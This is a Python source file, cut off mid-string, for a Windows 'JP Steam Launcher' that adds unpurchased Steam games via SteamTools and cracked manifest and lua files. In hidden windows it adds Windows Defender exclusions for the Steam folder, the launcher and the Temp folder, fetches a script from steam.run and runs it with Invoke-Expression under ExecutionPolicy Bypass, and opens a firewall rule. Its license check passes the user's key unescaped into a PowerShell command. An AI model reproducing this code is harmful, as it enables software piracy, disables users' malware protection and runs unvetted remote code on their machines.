# -*- coding: utf-8 -*-
"""
JP Steam Launcher - Interface gráfica com identidade JP. Sistemas
Instala/remove jogos na biblioteca Steam (aceita URL ou App ID)
Licenciamento: 1 key = 1 PC (Hardware ID)
"""

import sys
import os
import re
import json
import uuid
import hashlib
import threading
import ctypes
import winreg
import urllib.request
import urllib.error
import urllib.parse
import zipfile
import shutil
import tempfile
import subprocess
from datetime import datetime, timedelta, timezone

# URL padrão do servidor de licenças (VPS)
DEFAULT_LICENSE_SERVER = "http://191.252.100.71:5050"


def _get_license_url():
    url = os.environ.get("JP_LICENSE_URL", "")
    if url:
        return url.rstrip("/")
    appdata_dir = os.path.join(os.environ.get("APPDATA", ""), "JP-Steam-Launcher")
    exe_dir = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
    for base in [exe_dir, appdata_dir]:
        if base:
            cfg = os.path.join(base, "config.json")
            if os.path.exists(cfg):
                try:
                    with open(cfg, "r", encoding="utf-8") as f:
                        u = (json.load(f).get("license_server") or "").rstrip("/")
                        # Ignora localhost - usa VPS
                        if u and "localhost" not in u.lower() and "127.0.0.1" not in u:
                            return u
                except Exception:
                    pass
    # Cria config.json automaticamente na primeira execução
    try:
        os.makedirs(appdata_dir, exist_ok=True)
        cfg = os.path.join(appdata_dir, "config.json")
        with open(cfg, "w", encoding="utf-8") as f:
            json.dump({"license_server": DEFAULT_LICENSE_SERVER}, f, indent=2)
    except Exception:
        pass
    return DEFAULT_LICENSE_SERVER


LICENSE_SERVER_URL = _get_license_url()

# Cores - azul da logo JP. Sistemas, texto branco
CORES = {
    "fundo_escuro": "#1a1a1a",
    "fundo_card": "#252525",
    "botao_azul": "#2563eb",        # Azul da logo
    "botao_azul_hover": "#1d4ed8",
    "accent": "#10b981",
    "erro": "#ef4444",
    "erro_hover": "#dc2626",
    "texto": "#ffffff",
    "texto_secundario": "#b0b0b0",
    "borda": "#333333",
    "card_hover": "#2e2e2e",
}

GAMELIST_URL = "https://raw.githubusercontent.com/SteamTools-Team/GameList/main/games.json"
MAX_CARDS_VISIVEIS = 500  # Limite para não travar a interface

# Jogos mais populares/baixados da Steam (ordem de exibição quando sem busca)
POPULAR_APPIDS = [
    730, 271590, 578080, 1172470, 1085660, 1938090, 230410, 1245620, 381210, 1091500,
    570, 552520, 105600, 4000, 252490, 346110, 1229490, 1426210, 377160, 489830,
    292030, 236390, 359550, 218620, 413150, 227300, 440900, 221100, 728880, 1174180,
    1599340, 306130, 588650, 594570, 275850, 322330, 391540, 617290, 739630,
    1159690, 4069520, 1817070, 2050650, 2183900, 1142710, 1551360, 1817230,
]

# Fallback quando o download falha
JOGOS_FALLBACK = [
    (730, "Counter-Strike 2"), (271590, "GTA V"), (105600, "Terraria"), (4000, "Garry's Mod"),
    (578080, "PUBG"), (1172470, "Apex Legends"), (1229490, "ULTRAKILL"), (1426210, "It Takes Two"),
    (4069520, "Super Battle Golf"), (552520, "Path of Exile"), (346110, "ARK"), (230410, "Warframe"),
    (1245620, "Elden Ring"), (252490, "Rust"), (381210, "Dead by Daylight"),
]


def get_hardware_id():
    """Obtém ID único do hardware (Windows)."""
    try:
        result = subprocess.run(
            ["wmic", "csproduct", "get", "uuid"],
            capture_output=True, text=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        if result.returncode == 0 and result.stdout:
            lines = result.stdout.strip().split("\n")
            if len(lines) >= 2:
                hw = lines[1].strip()
                if hw and hw.lower() != "ffffffff-ffff-ffff-ffff-ffffffffffff":
                    return hashlib.sha256(hw.encode()).hexdigest()[:32]
    except Exception:
        pass
    # Fallback: MAC + hostname
    fallback = f"{uuid.getnode()}-{os.environ.get('COMPUTERNAME', '')}"
    return hashlib.sha256(fallback.encode()).hexdigest()[:32]


def get_license_config_path():
    """Salva em AppData para persistir entre execuções."""
    appdata = os.environ.get("APPDATA", os.path.expanduser("~"))
    folder = os.path.join(appdata, "JP-Steam-Launcher")
    os.makedirs(folder, exist_ok=True)
    return os.path.join(folder, "license.json")


def load_stored_key():
    try:
        path = get_license_config_path()
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            return data.get("key", "").strip()
    except Exception:
        pass
    return ""


def save_key(key):
    try:
        path = get_license_config_path()
        dir_path = os.path.dirname(path)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"key": key.strip()}, f, indent=2)
    except Exception:
        pass


def validate_license_powershell(key, hardware_id):
    """Valida key via PowerShell (não é bloqueado por firewall/antivírus)."""
    if not key or not hardware_id:
        return False, "Key inválida"
    url = f"{LICENSE_SERVER_URL}/api/validate"
    ps_script = (
        f"$body = @{{ key='{key.strip()}'; hardware_id='{hardware_id}' }} | ConvertTo-Json; "
        f"try {{ "
        f"  $r = Invoke-RestMethod -Uri '{url}' -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10; "
        f"  if ($r.valid -eq $true) {{ Write-Output ('OK|' + $r.message) }} "
        f"  else {{ Write-Output ('FAIL|' + $r.message) }} "
        f"}} catch {{ Write-Output ('ERR|' + $_.Exception.Message) }}"
    )
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True, text=True, timeout=20,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        output = r.stdout.strip()
        if output.startswith("OK|"):
            return True, output[3:] or "OK"
        elif output.startswith("FAIL|"):
            return False, output[5:] or "Key inválida"
        elif output.startswith("ERR|"):
            return False, f"Erro de conexão: {output[4:]}"
        else:
            return False, output or "Erro desconhecido"
    except subprocess.TimeoutExpired:
        return False, "Timeout ao conectar ao servidor"
    except Exception as e:
        return False, str(e)


def validate_license(key, hardware_id):
    """Valida key no servidor. Tenta PowerShell primeiro, fallback para urllib."""
    ok, msg = validate_license_powershell(key, hardware_id)
    if ok:
        return True, msg
    # Se PowerShell falhou por motivo que não é "key inválida", tenta urllib
    if "inválida" not in msg.lower() and "em uso" not in msg.lower():
        try:
            url = f"{LICENSE_SERVER_URL}/api/validate"
            data = json.dumps({"key": key.strip(), "hardware_id": hardware_id}).encode("utf-8")
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/json")
            proxy_handler = urllib.request.ProxyHandler({})
            opener = urllib.request.build_opener(proxy_handler)
            with opener.open(req, timeout=10) as r:
                resp = json.loads(r.read().decode())
                if resp.get("valid"):
                    return True, resp.get("message", "OK")
                return False, resp.get("message", "Key inválida")
        except Exception:
            pass
    return False, msg


def extract_app_id(text):
    """Extrai App ID de URL Steam ou texto com números."""
    if not text or not text.strip():
        return None
    text = text.strip()
    # URL: store.steampowered.com/app/4069520/... ou steamcommunity.com/app/...
    match = re.search(r'(?:store\.steampowered\.com|steamcommunity\.com)/app/(\d+)', text, re.I)
    if match:
        return match.group(1)
    # Apenas números
    digits = re.sub(r'\D', '', text)
    return digits if digits else None

try:
    from PIL import Image as PILImage
except ImportError:
    PILImage = None

try:
    import customtkinter as ctk
except ImportError:
    print("Instalando customtkinter...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "customtkinter"])
    import customtkinter as ctk


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def add_firewall_rule():
    """Adiciona regra no firewall para permitir conexões de saída. Requer admin."""
    if sys.platform != "win32" or not getattr(sys, "frozen", False):
        return False
    try:
        exe_path = sys.executable
        if not exe_path or not os.path.exists(exe_path):
            return False
        exe_path = os.path.normpath(exe_path)
        # Remove regra antiga se existir (evita duplicata)
        subprocess.run(
            f'netsh advfirewall firewall delete rule name="JP-Steam-Launcher"',
            shell=True, capture_output=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        # Adiciona regra de saída
        cmd = f'netsh advfirewall firewall add rule name="JP-Steam-Launcher" dir=out action=allow program="{exe_path}"'
        r = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        return r.returncode == 0
    except Exception:
        return False


def get_steam_path():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\WOW6432Node\Valve\Steam",
            0, winreg.KEY_READ
        )
        path, _ = winreg.QueryValueEx(key, "InstallPath")
        winreg.CloseKey(key)
        return path
    except:
        return None


def is_steamtools_installed():
    """Verifica se SteamTools (xinput1_4.dll) está instalado."""
    steam_path = get_steam_path()
    if not steam_path:
        return False
    return os.path.exists(os.path.join(steam_path, "xinput1_4.dll"))


def _add_defender_exclusion():
    """Adiciona exclusão do Windows Defender para a pasta da Steam e para o próprio launcher."""
    paths = []
    steam_path = get_steam_path()
    if steam_path:
        paths.append(steam_path)
    if getattr(sys, "frozen", False) and sys.executable:
        paths.append(sys.executable)
        exe_dir = os.path.dirname(sys.executable)
        if exe_dir and exe_dir not in paths:
            paths.append(exe_dir)
    temp_dir = os.environ.get("LOCALAPPDATA", "")
    if temp_dir:
        paths.append(os.path.join(temp_dir, "Temp"))
    for p in paths:
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 f"Add-MpPreference -ExclusionPath '{p}' -ErrorAction SilentlyContinue"],
                capture_output=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
        except Exception:
            pass


def install_steamtools_and_plugins(log_callback):
    """
    Instala apenas SteamTools (sem Millennium/LuaTools).
    Retorna (sucesso, mensagem).
    """
    steam_path = get_steam_path()
    if not steam_path:
        return False, "Steam não encontrada no sistema"

    log_callback("Configurando exclusão no antivírus...", "info")
    _add_defender_exclusion()

    return _install_steamtools_only(log_callback)


def _install_steamtools_only(log_callback):
    """Instala apenas SteamTools via steam.run (fallback)."""
    steam_path = get_steam_path()
    if not steam_path:
        return False, "Steam não encontrada"
    close_steam()
    log_callback("Instalando SteamTools...", "info")
    ps_script = r'''
$steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction SilentlyContinue).InstallPath
if (-not $steamPath) { exit 1 }
Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 2
$caminho = Join-Path $steamPath "xinput1_4.dll"
for ($i = 1; $i -le 5; $i++) {
    try {
        $script = Invoke-RestMethod "https://steam.run"
        $filtered = ($script -split "`n" | Where-Object { $_ -notmatch "steam\.exe|Start-Sleep|Write-Host|cls|exit" }) -join "`n"
        Invoke-Expression $filtered
    } catch {}
    if (Test-Path $caminho) { exit 0 }
    Start-Sleep 2
}
exit 1
'''
    try:
        proc = subprocess.Popen(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        proc.wait(timeout=120)
        if is_steamtools_installed():
            log_callback("SteamTools instalado!", "ok")
            return True, steam_path
        return False, "Falha ao instalar SteamTools. Execute: jp-steam-setup.ps1"
    except Exception as e:
        return False, str(e)


def uninstall_tudo(log_callback):
    """
    Remove TUDO: SteamTools, Millennium, LuaTools, stplug-in e depotcache.
    Retorna (sucesso, mensagem).
    """
    steam_path = get_steam_path()
    if not steam_path:
        return False, "Steam não encontrada"
    close_steam()
    removidos = []
    itens = [
        (os.path.join(steam_path, "xinput1_4.dll"), "arquivo", "xinput1_4.dll"),
        (os.path.join(steam_path, "millennium.dll"), "arquivo", "millennium.dll"),
        (os.path.join(steam_path, "python311.dll"), "arquivo", "python311.dll"),
        (os.path.join(steam_path, "ext"), "pasta", "ext"),
        (os.path.join(steam_path, "plugins", "luatools"), "pasta", "LuaTools"),
        (os.path.join(steam_path, "config", "stplug-in"), "pasta", "stplug-in"),
        (os.path.join(steam_path, "config", "depotcache"), "pasta", "depotcache"),
    ]
    depotcache_alt = os.path.join(steam_path, "depotcache")
    if os.path.exists(depotcache_alt):
        itens.append((depotcache_alt, "pasta", "depotcache"))
    try:
        for path, tipo, nome in itens:
            if os.path.exists(path):
                if tipo == "arquivo":
                    os.remove(path)
                else:
                    shutil.rmtree(path)
                removidos.append(nome)
                log_callback(f"Removido: {nome}", "ok")
        if removidos:
            return True, steam_path
        return False, "Nenhum arquivo do SteamTools/Millennium/LuaTools encontrado"
    except Exception as e:
        return False, str(e)


def download_game_files(app_id, log_callback):
    steam_path = get_steam_path()
    if not steam_path:
        return False, "Steam não encontrada"

    stplug_in = os.path.join(steam_path, "config", "stplug-in")
    depotcache = os.path.join(steam_path, "config", "depotcache")
    if not os.path.exists(depotcache):
        depotcache = os.path.join(steam_path, "depotcache")

    steamtools = os.path.join(steam_path, "xinput1_4.dll")
    if not os.path.exists(steamtools):
        return False, "SteamTools não instalado. Execute: irm steam.run | iex"

    os.makedirs(stplug_in, exist_ok=True)
    os.makedirs(depotcache, exist_ok=True)

    temp_dir = tempfile.mkdtemp(prefix=f"jp-launcher-{app_id}-")
    success = False
    last_error = "Arquivos não encontrados nas fontes"

    # Fonte 1: TwentyTwo Cloud (ZIP)
    url_zip = f"http://masss.pythonanywhere.com/storage?auth=IEOIJE54esfsipoE56GE4&appid={app_id}"
    try:
        log_callback("Buscando arquivos...", "info")
        zip_path = os.path.join(temp_dir, "game.zip")
        urllib.request.urlretrieve(url_zip, zip_path)

        if os.path.getsize(zip_path) > 100:
            with zipfile.ZipFile(zip_path, 'r') as z:
                z.extractall(temp_dir)

            for root, _, files in os.walk(temp_dir):
                for f in files:
                    src = os.path.join(root, f)
                    if f.endswith(".lua"):
                        shutil.copy2(src, stplug_in)
                        log_callback(f"Lua: {f}", "ok")
                    elif f.endswith(".manifest"):
                        shutil.copy2(src, depotcache)
                        log_callback(f"Manifest: {f}", "ok")
                    elif f.endswith(".vdf"):
                        shutil.copy2(src, os.path.join(steam_path, "config"))
                        log_callback(f"Key: {f}", "ok")
            success = True
    except Exception as e:
        last_error = str(e)
        log_callback(str(e), "erro")

    # Fallback: apenas .lua do ManifestHub
    if not success:
        url_lua = f"https://raw.githubusercontent.com/SteamAutoCracks/ManifestHub/main/{app_id}.lua"
        try:
            log_callback("Tentando fonte alternativa...", "info")
            req = urllib.request.Request(url_lua)
            with urllib.request.urlopen(req, timeout=10) as r:
                content = r.read().decode()
                if len(content) > 50 and "404" not in content:
                    lua_path = os.path.join(stplug_in, f"{app_id}.lua")
                    with open(lua_path, "w", encoding="utf-8") as f:
                        f.write(content)
                    log_callback(f"Lua salvo: {app_id}.lua", "ok")
                    success = True
        except Exception as e:
            last_error = str(e)
            log_callback(str(e), "erro")

    shutil.rmtree(temp_dir, ignore_errors=True)
    if success:
        return True, steam_path
    return False, f"Este jogo (App ID {app_id}) não está disponível nas bases de dados. Nem todos os jogos têm manifest/lua público. Tente: steamtools.site, luamani.vercel.app ou manifestlua.blog para verificar se existe."


def fetch_dlcs(app_id):
    """Busca lista de DLCs de um jogo via Steam Store API. Retorna [(dlc_id, nome), ...]."""
    try:
        url = f"https://store.steampowered.com/api/appdetails?appids={app_id}"
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "JP-Steam-Launcher/1.0")
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read().decode())
        app_data = data.get(str(app_id), {})
        if not app_data.get("success"):
            return []
        info = app_data.get("data", {})
        dlc_ids = info.get("dlc", [])
        if not dlc_ids:
            return []
        dlcs = []
        # Busca nomes das DLCs em lotes de 20
        for i in range(0, len(dlc_ids), 20):
            batch = dlc_ids[i:i+20]
            for dlc_id in batch:
                try:
                    dlc_url = f"https://store.steampowered.com/api/appdetails?appids={dlc_id}"
                    dlc_req = urllib.request.Request(dlc_url)
                    dlc_req.add_header("User-Agent", "JP-Steam-Launcher/1.0")
                    with urllib.request.urlopen(dlc_req, timeout=10) as dr:
                        dlc_data = json.loads(dr.read().decode())
                    dlc_info = dlc_data.get(str(dlc_id), {})
                    if dlc_info.get("success"):
                        nome = dlc_info["data"].get("name", f"DLC {dlc_id}")
                        dlcs.append((str(dlc_id), nome))
                    else:
                        dlcs.append((str(dlc_id), f"DLC {dlc_id}"))
                except Exception:
                    dlcs.append((str(dlc_id), f"DLC {dlc_id}"))
        return dlcs
    except Exception:
        return []


def close_steam():
    try:
        os.system('taskkill /F /IM steam.exe 2>nul')
        import time
        time.sleep(2)
    except:
        pass


def remove_game_files(app_id, log_callback):
    """Remove arquivos do jogo (lua, manifest) da Steam."""
    steam_path = get_steam_path()
    if not steam_path:
        return False, "Steam não encontrada"

    stplug_in = os.path.join(steam_path, "config", "stplug-in")
    depotcache = os.path.join(steam_path, "config", "depotcache")
    if not os.path.exists(depotcache):
        depotcache = os.path.join(steam_path, "depotcache")

    # Remover .lua do app
    lua_path = os.path.join(stplug_in, f"{app_id}.lua")
    if os.path.exists(lua_path):
        os.remove(lua_path)
        log_callback(f"Removido: {app_id}.lua", "ok")
        return True, steam_path

    if os.path.exists(stplug_in):
        for f in os.listdir(stplug_in):
            if f.endswith(".lua") and app_id in f:
                os.remove(os.path.join(stplug_in, f))
                log_callback(f"Removido: {f}", "ok")
                return True, steam_path

    return False, "Jogo não encontrado na biblioteca"


def restart_steam(log_callback):
    """Fecha e reinicia a Steam."""
    steam_path = get_steam_path()
    if not steam_path:
        return False, "Steam não encontrada"
    steam_exe = os.path.join(steam_path, "steam.exe")
    if not os.path.exists(steam_exe):
        return False, "steam.exe não encontrado"
    close_steam()
    log_callback("Reiniciando Steam...", "ok")
    subprocess.Popen([steam_exe, "-clearbeta"], creationflags=subprocess.CREATE_NO_WINDOW)
    return True, steam_path


class LauncherApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("JP Steam Launcher")
        self.resizable(True, True)
        self.minsize(750, 550)

        # Tema JP. Sistemas
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.configure(fg_color=CORES["fundo_escuro"])

        # Abrir centralizado com tamanho adequado (80% da tela, max 1100x750)
        screen_w = self.winfo_screenwidth()
        screen_h = self.winfo_screenheight()
        w = min(int(screen_w * 0.8), 1100)
        h = min(int(screen_h * 0.8), 750)
        x = (screen_w - w) // 2
        y = (screen_h - h) // 2
        self.geometry(f"{w}x{h}+{x}+{y}")

        # Ícone da janela (se existir icon.ico)
        base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        icon_path = os.path.join(base, "icon.ico")
        if os.path.exists(icon_path):
            try:
                self.iconbitmap(icon_path)
            except Exception:
                pass

        self._build_ui()
        self.after(100, self._check_and_install_requirements)

    def _check_and_install_requirements(self):
        """Verifica SteamTools; se não estiver instalado, instala automaticamente."""
        if is_steamtools_installed():
            return
        # Mostrar diálogo e instalar
        dlg = ctk.CTkToplevel(self)
        dlg.title("Instalação necessária")
        dlg.geometry("420x180")
        dlg.transient(self)
        dlg.grab_set()
        dlg.configure(fg_color=CORES["fundo_escuro"])
        ctk.CTkLabel(dlg, text="SteamTools não encontrado.", font=ctk.CTkFont(size=14, weight="bold"),
                     text_color=CORES["texto"]).pack(pady=(20, 8))
        ctk.CTkLabel(dlg, text="Instalando SteamTools automaticamente...",
                     font=ctk.CTkFont(size=12), text_color=CORES["texto_secundario"],
                     wraplength=380).pack(pady=(0, 16))
        log_dlg = ctk.CTkTextbox(dlg, height=60, font=ctk.CTkFont(size=10), fg_color=CORES["fundo_card"])
        log_dlg.pack(fill="x", padx=20, pady=(0, 12))

        def _log(msg, _level="info"):
            log_dlg.insert("end", f"• {msg}\n")
            log_dlg.see("end")
            dlg.update_idletasks()

        def _worker():
            success, result = install_steamtools_and_plugins(_log)
            self.after(0, lambda: _finish(success, result))

        def _finish(success, result):
            dlg.grab_release()
            dlg.destroy()
            if success:
                steam_exe = os.path.join(result, "steam.exe")
                if os.path.exists(steam_exe):
                    import time
                    time.sleep(3)
                    subprocess.Popen([steam_exe, "-dev"], creationflags=subprocess.CREATE_NO_WINDOW)
                    self._show_info(
                        "Instalação concluída",
                        "SteamTools instalado com sucesso!\n\n"
                        "A Steam está abrindo. Aguarde ela abrir completamente.\n\n"
                        "Se a Steam não abrir, vá na aba 'Steam não abre'."
                    )
            else:
                self._show_error("Falha na instalação", str(result))

        threading.Thread(target=_worker, daemon=True).start()

    def _show_error(self, titulo, msg):
        dlg = ctk.CTkToplevel(self)
        dlg.title(titulo)
        dlg.geometry("450x150")
        dlg.transient(self)
        dlg.configure(fg_color=CORES["fundo_escuro"])
        ctk.CTkLabel(dlg, text=msg, font=ctk.CTkFont(size=12), text_color=CORES["erro"],
                     wraplength=400).pack(pady=20, padx=20)
        ctk.CTkButton(dlg, text="OK", command=dlg.destroy, fg_color=CORES["botao_azul"]).pack(pady=10)

    def _show_info(self, titulo, msg):
        dlg = ctk.CTkToplevel(self)
        dlg.title(titulo)
        dlg.geometry("450x200")
        dlg.transient(self)
        dlg.configure(fg_color=CORES["fundo_escuro"])
        ctk.CTkLabel(dlg, text=msg, font=ctk.CTkFont(size=12), text_color=CORES["texto"],
                     wraplength=400, justify="left").pack(pady=20, padx=20)
        ctk.CTkButton(dlg, text="OK", command=dlg.destroy, fg_color=CORES["botao_azul"]).pack(pady=10)

    def _build_ui(self):
        # Header com logo JP. Sistemas (do site)
        base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        logo_path = os.path.join(base, "logo_site.png")

        header = ctk.CTkFrame(self, fg_color="transparent")
        header.pack(fill="x", padx=24, pady=(24, 16))

        header_inner = ctk.CTkFrame(header, fg_color="transparent")
        header_inner.pack(anchor="w")

        if os.path.exists(logo_path) and PILImage:
            try:
                pil_img = PILImage.open(logo_path).convert("RGBA")
                logo_img = ctk.CTkImage(light_image=pil_img, dark_image=pil_img, size=(48, 48))
                ctk.CTkLabel(header_inner, image=logo_img, text="").pack(side="left", padx=(0, 12))
            except Exception:
                pass

        titulo_frame = ctk.CTkFrame(header_inner, fg_color="transparent")
        titulo_frame.pack(side="left")
        ctk.CTkLabel(
            titulo_frame,
            text="JP. Sistemas",
            font=ctk.CTkFont(family="Segoe UI", size=28, weight="bold"),
            text_color=CORES["texto"],
        ).pack(anchor="w")
        ctk.CTkLabel(
            titulo_frame,
            text="Steam Launcher · Cole o link ou escolha um jogo",
            font=ctk.CTkFont(size=12),
            text_color=CORES["texto_secundario"],
        ).pack(anchor="w")

        # Abas: Instalar | Jogos disponíveis | Online Fix | Fix do jogo | Steam não abre | Desinstalar
        self.tabview = ctk.CTkTabview(
            self, fg_color=CORES["fundo_card"],
            segmented_button_fg_color=CORES["fundo_escuro"],
            segmented_button_selected_color=CORES["botao_azul"],
            segmented_button_selected_hover_color=CORES["botao_azul_hover"],
            segmented_button_unselected_color=CORES["fundo_card"],
            segmented_button_unselected_hover_color=CORES["borda"],
            text_color="white",
        )
        self.tabview.pack(fill="both", expand=True, padx=24, pady=(0, 8))

        status_bar = ctk.CTkFrame(self, fg_color=CORES["fundo_card"], height=28, corner_radius=6)
        status_bar.pack(fill="x", padx=24, pady=(0, 12))
        status_bar.pack_propagate(False)
        st_installed = is_steamtools_installed()
        st_text = "SteamTools: Instalado" if st_installed else "SteamTools: Não instalado"
        st_color = CORES["accent"] if st_installed else CORES["erro"]
        self.lbl_status_st = ctk.CTkLabel(status_bar, text=st_text, font=ctk.CTkFont(size=11),
                                          text_color=st_color)
        self.lbl_status_st.pack(side="left", padx=(12, 0))
        ctk.CTkLabel(status_bar, text="·", font=ctk.CTkFont(size=11),
                     text_color=CORES["texto_secundario"]).pack(side="left", padx=6)
        steam_path = get_steam_path()
        steam_txt = f"Steam: {steam_path}" if steam_path else "Steam: Não encontrada"
        ctk.CTkLabel(status_bar, text=steam_txt, font=ctk.CTkFont(size=11),
                     text_color=CORES["texto_secundario"]).pack(side="left")
        ctk.CTkLabel(status_bar, text="JP Steam Launcher v2.0", font=ctk.CTkFont(size=10),
                     text_color=CORES["borda"]).pack(side="right", padx=(0, 12))
        tab_instalar = self.tabview.add("Instalar")
        tab_jogos = self.tabview.add("Jogos disponíveis")
        tab_online = self.tabview.add("Online Fix")
        tab_fix = self.tabview.add("Fix do jogo")
        tab_steam = self.tabview.add("Steam não abre")
        tab_desinstalar = self.tabview.add("Desinstalar")

        # === ABA INSTALAR ===
        card = ctk.CTkFrame(
            tab_instalar,
            fg_color="transparent",
        )
        card.pack(fill="both", expand=True)

        # Input - aceita URL ou App ID
        ctk.CTkLabel(
            card,
            text="Link da Steam ou App ID",
            font=ctk.CTkFont(size=13),
            text_color=CORES["texto_secundario"],
        ).pack(anchor="w", padx=20, pady=(20, 4))

        self.entry_appid = ctk.CTkEntry(
            card,
            placeholder_text="https://store.steampowered.com/app/4069520/... ou 4069520",
            height=44,
            font=ctk.CTkFont(size=13),
            fg_color=CORES["fundo_escuro"],
            border_color=CORES["borda"],
        )
        self.entry_appid.pack(fill="x", padx=20, pady=(0, 8))
        self.entry_appid.bind("<Return>", lambda e: self._on_install())

        ctk.CTkLabel(
            card,
            text="Cole o link completo da loja Steam ou apenas o número do App ID",
            font=ctk.CTkFont(size=11),
            text_color=CORES["texto_secundario"],
        ).pack(anchor="w", padx=20, pady=(0, 16))

        # Botões - azul da logo, texto branco
        btn_frame = ctk.CTkFrame(card, fg_color="transparent")
        btn_frame.pack(fill="x", padx=20, pady=(0, 12))

        btn_style = dict(
            font=ctk.CTkFont(size=13, weight="bold"),
            height=42,
            fg_color=CORES["botao_azul"],
            hover_color=CORES["botao_azul_hover"],
            text_color="white",
        )

        self.btn_install = ctk.CTkButton(
            btn_frame, text="▶  Instalar jogo",
            command=self._on_install, **btn_style
        )
        self.btn_install.pack(side="left", fill="x", expand=True, padx=(0, 6))

        self.btn_remove = ctk.CTkButton(
            btn_frame, text="🗑  Remover jogo",
            command=self._on_remove,
            font=ctk.CTkFont(size=13, weight="bold"), height=42,
            fg_color=CORES["erro"], hover_color=CORES["erro_hover"],
            text_color="white",
        )
        self.btn_remove.pack(side="left", fill="x", expand=True, padx=3)

        self.btn_restart = ctk.CTkButton(
            btn_frame, text="↻  Reiniciar Steam",
            command=self._on_restart, **btn_style
        )
        self.btn_restart.pack(side="left", fill="x", expand=True, padx=(6, 0))

        # Área de log
        log_frame = ctk.CTkFrame(card, fg_color=CORES["fundo_escuro"], corner_radius=8)
        log_frame.pack(fill="both", expand=True, padx=20, pady=(0, 20))

        self.log_text = ctk.CTkTextbox(
            log_frame,
            font=ctk.CTkFont(family="Consolas", size=11),
            fg_color="transparent",
            text_color=CORES["texto_secundario"],
            wrap="word",
        )
        self.log_text.pack(fill="both", expand=True, padx=8, pady=8)
        self.log_text._textbox.tag_config("ok", foreground=CORES["accent"])
        self.log_text._textbox.tag_config("erro", foreground=CORES["erro"])
        self.log_text._textbox.tag_config("info", foreground=CORES["texto_secundario"])

        # === ABA JOGOS DISPONÍVEIS ===
        self._games_data = []
        self._cache_imgs = {}
        self._api_img_urls = {}
        self._cards_container = None

        top_jogos = ctk.CTkFrame(tab_jogos, fg_color="transparent")
        top_jogos.pack(fill="x", padx=8, pady=(8, 4))

        self.lbl_total = ctk.CTkLabel(top_jogos, text="Total: 0 jogos", font=ctk.CTkFont(size=13, weight="bold"),
                                      text_color=CORES["texto"])
        self.lbl_total.pack(side="left", padx=(0, 16))

        ctk.CTkLabel(top_jogos, text="Buscar:", font=ctk.CTkFont(size=12), text_color=CORES["texto_secundario"]).pack(side="left", padx=(0, 4))
        self.entry_busca = ctk.CTkEntry(top_jogos, placeholder_text="Cole o link da Steam ou nome/ID...", width=260, height=28)
        self.entry_busca.pack(side="left", padx=(0, 8))
        self.entry_busca.bind("<Return>", lambda e: self._filtrar_jogos())
        btn_busca = ctk.CTkButton(top_jogos, text="Buscar", width=80, height=28, font=ctk.CTkFont(size=12, weight="bold"),
                                 fg_color=CORES["botao_azul"], hover_color=CORES["botao_azul_hover"],
                                 text_color="white", command=self._filtrar_jogos)
        btn_busca.pack(side="left", padx=(0, 4))

        btn_limpar = ctk.CTkButton(top_jogos, text="✕", width=28, height=28,
                                   font=ctk.CTkFont(size=12), fg_color=CORES["fundo_card"],
                                   hover_color=CORES["borda"], text_color=CORES["texto_secundario"],
                                   command=self._limpar_busca)
        btn_limpar.pack(side="left", padx=(0, 8))

        self.btn_atualizar_lista = ctk.CTkButton(
            top_jogos, text="↻ Atualizar lista", width=120, height=28,
            font=ctk.CTkFont(size=12, weight="bold"),
            fg_color=CORES["accent"], hover_color="#0d9668",
            text_color="white", command=self._atualizar_lista,
        )
        self.btn_atualizar_lista.pack(side="right", padx=(0, 4))

        self.scroll_jogos = ctk.CTkScrollableFrame(tab_jogos, fg_color="transparent")
        self.scroll_jogos.pack(fill="both", expand=True, padx=8, pady=8)
        for c in range(4):
            self.scroll_jogos.columnconfigure(c, weight=1)

        self.lbl_carregando = ctk.CTkLabel(self.scroll_jogos, text="Carregando lista de jogos...",
                                           font=ctk.CTkFont(size=14), text_color=CORES["texto_secundario"])
        self.lbl_carregando.pack(pady=40)

        threading.Thread(target=self._carregar_gamelist, daemon=True).start()

        # === ABA ONLINE FIX ===
        scroll_online = ctk.CTkScrollableFrame(tab_online, fg_color="transparent")
        scroll_online.pack(fill="both", expand=True, padx=12, pady=12)

        txt_online = """🔗 MEU JOGO FUNCIONA ONLINE?

Depende. Os únicos jogos multiplayer que funcionam são Forza 4 e 5. Todo o resto dos jogos 100% online, só comprando mesmo.

Exemplo: Arc Raiders é multiplayer, então não dá.

📡 E OS JOGOS COOP OU VIA LAN?
Sim! E a maioria precisa de um fix. Veja como instalar:

📋 COMO INSTALAR O ONLINE FIX (MANUAL):

1. Acesse: online-fix.me
   (Está em russo? Traduza a página ou use Google Lens)

2. Busque pelo App ID ou nome do jogo

3. Leia as informações da página:
   • Precisa de login para baixar
